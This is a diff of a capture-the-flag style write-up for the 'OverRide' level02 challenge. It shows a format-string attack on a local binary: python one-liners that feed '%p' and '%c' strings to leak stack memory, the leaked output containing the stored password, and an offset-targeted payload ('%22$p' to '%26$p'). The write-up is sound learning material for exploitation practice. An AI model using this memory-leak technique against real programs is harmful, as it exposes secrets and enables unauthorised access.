@@ -13,17 +13,20 @@ scp -P 4242 level02@192.168.56.109:level02 binary/
 
 size of the pass : 40\
 40 / 8 = 5\
-We are looking for 5 64bits addresses followed by a null address
+We are looking for 5 64bits addresses
+
 ```
-$ python -c 'print "%p " * 50' > /tmp/level02 ; cat /tmp/level02 | ./level02
+$ python -c 'print "%c," * 50' > /tmp/level02 ; cat /tmp/level02 | ./level02
 ===== [ Secure Access System v1.0 ] =====
 /***************************************\
 | You must login to access this system. |
 \**************************************/
 --[ Username: --[ Password: *****************************************
-0x7fffffffe4f0 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x207025 (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
+�,,%,*,*,�,%,,,c,%,,,c,%,,,,,,,,H,Q,X,s,M,,%,,,c,%,,,c, does not have access!
 ```
-so offset = 22
+`H,Q,X,s,M` this part looks like the password.\
+So the offset is 22.
+
 ```
 level02@OverRide:~$ python -c 'print " %22$p %23$p %24$p %25$p %26$p"' > /tmp/level02 ; cat /tmp/level02 | ./level02 
 ===== [ Secure Access System v1.0 ] =====
